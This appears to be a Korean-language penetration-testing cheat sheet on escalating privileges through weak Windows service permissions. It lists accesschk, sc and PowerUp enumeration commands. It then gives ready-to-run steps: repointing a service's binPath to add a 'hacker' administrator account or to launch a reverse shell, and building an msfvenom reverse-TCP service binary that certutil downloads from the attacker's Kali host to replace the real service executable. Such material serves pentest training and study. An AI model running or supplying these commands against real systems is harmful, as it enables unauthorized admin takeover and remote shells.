## 탐지

```bash
:: accesschk.exe(Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * 2>nul
accesschk.exe -uwcqv "Everyone" * 2>nul
accesschk.exe -uwcqv <사용자명> * 2>nul

:: 특정 서비스
accesschk.exe -uwcqv daclsvc 2>nul

:: sc로 상세 정보
sc qc <서비스명>
sc query <서비스명>
```

```powershell
# PowerUp
Get-ModifiableService
Get-ModifiableServiceFile
```

---

## 시나리오 A: SERVICE_CHANGE_CONFIG 권한

서비스 바이너리 경로를 임의 명령으로 교체 가능

```bash
:: 관리자 계정 추가
sc config <취약서비스> binPath= "cmd.exe /k net localgroup administrators hacker /add"
sc config <취약서비스> obj= LocalSystem
net stop <취약서비스>
net start <취약서비스>

:: 리버스쉘 실행
sc config <취약서비스> binPath= "C:\Temp\shell.exe"
sc config <취약서비스> obj= LocalSystem
net stop <취약서비스> && net start <취약서비스>
```

## 시나리오 B: 서비스 바이너리 자체가 교체 가능

```bash
# 칼리에서 악성 서비스 바이너리 생성
msfvenom -p windows/shell_reverse_tcp \
  LHOST=<칼리IP> LPORT=4444 \
  -f exe-service -o service.exe
```

```bash
:: 원본 백업
copy "C:\path\to\service.exe" "C:\path\to\service.exe.bak"

:: 악성 바이너리로 교체
certutil -urlcache -split -f http://<칼리IP>/service.exe "C:\path\to\service.exe"

:: 서비스 재시작
net stop <서비스> && net start <서비스>
```
